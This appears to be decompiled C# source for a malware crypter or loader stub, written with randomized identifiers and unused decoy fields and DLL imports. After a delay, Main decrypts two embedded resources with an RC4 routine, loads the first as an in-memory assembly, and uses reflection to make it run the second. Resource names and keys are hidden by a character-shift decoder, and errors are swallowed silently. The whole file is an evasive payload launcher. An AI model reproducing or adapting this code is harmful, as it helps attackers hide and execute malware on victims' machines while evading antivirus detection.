using System;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class elgplhfjcct
{
	private static RadioButton elgplhmxqwi;

	public static object elgplhtpntd;

	private static object elgplhgtulw;

	private static RadioButton elgplhydxmq;

	private static decimal elgplhqqtfi;

	public static object elgplhqikty;

	internal static ListBox elgplhrjhhg;

	private static DateTime elgplhicfip;

	public static object elgplhryrqn;

	[AccessedThroughProperty("elgplhxwhyf")]
	private static ComboBox _elgplhxwhyf;

	private static byte elgplhndlcn;

	public static object elgplhwlfdw;

	private static TreeView elgplhhdxej;

	public static DateTime elgplhcztmc;

	private static object elgplhxiqnj;

	private static ComboBox elgplhxwhyf
	{
		get
		{
			return _elgplhxwhyf;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_elgplhxwhyf = value;
		}
	}

	[DllImport("elgplhwlmdm.otn", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern byte[] elgplhfojnz(ref int elgplhcggfh, int elgplhjlofl, int elgplhkruwq);

	[DllImport("elgplhgqcnc.gem", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern byte[] elgplhhlqgp(byte elgplhkmnjw, char elgplhntdjm, byte elgplhnrfdp);

	[STAThread]
	public static void Main()
	{
		try
		{
			Thread.Sleep(3484);
			AppDomain.CurrentDomain.Load(elgplhleohl((byte[])new ResourceManager(elgplhomrcj("⌣〉⌥⌮〉⌦⌲⌷⌣"), Assembly.GetExecutingAssembly()).GetObject(elgplhomrcj("⌣〉⌥⌮〉⌦⌡⌭⌶")), elgplhomrcj("〈⌨⌶⌬⌶⌮⌰⌥⌰⌶"))).GetTypes()[Conversions.ToInteger(elgplhomrcj("⋮"))].GetMethod(elgplhomrcj("⌣〉⌥⌮〉⌦⌶⌰⌧"))!.Invoke(null, new object[1] { elgplhleohl((byte[])new ResourceManager(elgplhomrcj("⌣〉⌥⌮〉⌦⌳⌲⌸"), Assembly.GetExecutingAssembly()).GetObject(elgplhomrcj("⌣〉⌥⌮〉⌦⌡⌧⌰")), elgplhomrcj("⌫⌫〉⌭⌦⌣⌦⌵⌣⌢〈")) });
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("elgplhepftr.kfn", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	public static extern int[] elgplheelhi(int elgplhezqjk, char elgplhqllze, byte elgplhkxixj);

	private static byte[] elgplhleohl(byte[] elgplhtikqx, string elgplhhnico)
	{
		uint[] array = new uint[256];
		byte[] array2 = new byte[elgplhtikqx.Length - 1 + 1];
		uint num = 0u;
		do
		{
			array[num] = num;
			num++;
		}
		while (num <= 255);
		num = 0u;
		uint num2 = default(uint);
		do
		{
			num2 = (uint)((num2 + Encoding.Default.GetBytes(elgplhhnico)[(int)((long)num % (long)elgplhhnico.Length)] + array[num]) & 0xFFuL);
			uint num3 = array[num];
			array[num] = array[num2];
			array[num2] = num3;
			num++;
		}
		while (num <= 255);
		num = 0u;
		num2 = 0u;
		int num4 = array2.Length - 1;
		for (int i = 0; i <= num4; i++)
		{
			num = (uint)(((ulong)num + 1uL) & 0xFFuL);
			num2 = (uint)((num2 + array[num]) & 0xFFuL);
			uint num3 = array[num];
			array[num] = array[num2];
			array[num2] = num3;
			array2[i] = (byte)(elgplhtikqx[i] ^ array[(int)((long)(array[num] + array[num2]) & 0xFFL)]);
		}
		return array2;
	}

	private static string elgplhomrcj(string strelgplhtikqx)
	{
		int num = Strings.Len(strelgplhtikqx);
		for (int i = 1; i <= num; i++)
		{
			StringType.MidStmtStr(ref strelgplhtikqx, i, 1, Conversions.ToString(Strings.ChrW(Strings.AscW(Strings.Mid(strelgplhtikqx, i, 1)) - 8894)));
		}
		return strelgplhtikqx;
	}

	[DllImport("elgplhcjzem.plc", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	public static extern int[] elgplhfgkwm([MarshalAs(UnmanagedType.VBByRefStr)] ref string elgplhgiuim, int elgplhoriwn, byte elgplhwyzui);

	[DllImport("elgplhnpexw.rdc", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern byte[] elgplhiowmu(char elgplhktqen, int elgplhpqzkk, char elgplhotqhn);
}
